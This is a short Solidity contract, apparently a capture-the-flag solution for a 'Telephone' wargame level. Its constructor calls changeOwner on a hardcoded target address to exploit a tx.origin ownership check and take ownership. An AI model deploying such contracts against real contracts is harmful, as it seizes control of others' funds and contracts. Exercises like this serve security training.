// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    address constant private TARGET = 0x6B03a1A9DDf480a138995EDd4129839C4858847f;
    constructor(){
        ITelephone(TARGET).changeOwner(msg.sender);
    }
}
